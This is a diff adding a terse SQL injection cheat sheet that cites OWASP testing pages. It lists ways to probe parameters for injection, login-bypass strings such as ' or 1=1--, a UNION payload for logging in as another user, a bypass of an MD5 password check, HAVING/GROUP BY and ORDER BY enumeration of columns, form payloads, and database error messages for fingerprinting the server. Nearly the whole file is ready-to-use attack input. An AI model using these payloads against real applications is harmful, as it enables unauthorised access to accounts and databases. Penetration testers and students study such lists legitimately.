@@ -1,0 +1,69 @@
+most powerful source found : 
+https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OTG-INPVAL-005)
+https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF
+
+check if vulenrable
+---------------------------------
+1) put a single quote (') or a semicolon (;)
+2) play with parameter : product.php?id=1+5
+3) product.php?id=4 OR 1=2 || 4' AND '1' = '2  //maybe error will occur
+4) put a string when number expected
+
+
+Bypassing Login Screens (SMO+)
+----------------------------------------
+admin' --
+admin' #
+admin'/*
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or '1'='1--
+') or ('1'='1--
+....
+Login as different user (SM*) 
+' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--
+
+Bypassing second MD5 hash check login screens
+-------------------------------------------------------------
+1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+
+Finding Column Names with HAVING BY - Error Based (S)
+------------------------------------------
+' HAVING 1=1 --
+' GROUP BY table.columnfromerror1 HAVING 1=1 --
+' GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 --
+' GROUP BY table.columnfromerror1, columnfromerror2, columnfromerror(n) HAVING 1=1 -- and so on
+
+Finding how many columns in SELECT query by ORDER BY (MSO+)
+------------------------------------------
+ORDER BY 1--
+ORDER BY 2--
+ORDER BY N-- so on
+
+
+
+form cheat sheets : 
+1' or '1' = '1
+1' or '1' = '1'))/*
+1' or '1' = '1')) LIMIT 1/* 
+
+
+
+sql servers fingerprints
+-----------------------------------------
+mysql - 
+You have an error in your SQL syntax; check the manual
+that corresponds to your MySQL server version for the
+right syntax to use near '\'' at line 1
+
+oracle - 
+ORA-00933: SQL command not properly ended
+
+MS SQL Server - 
+
+Microsoft SQL Native Client error ‘80040e14’
+Unclosed quotation mark after the character string
+
+postgresql - 
+Query failed: ERROR: syntax error at or near
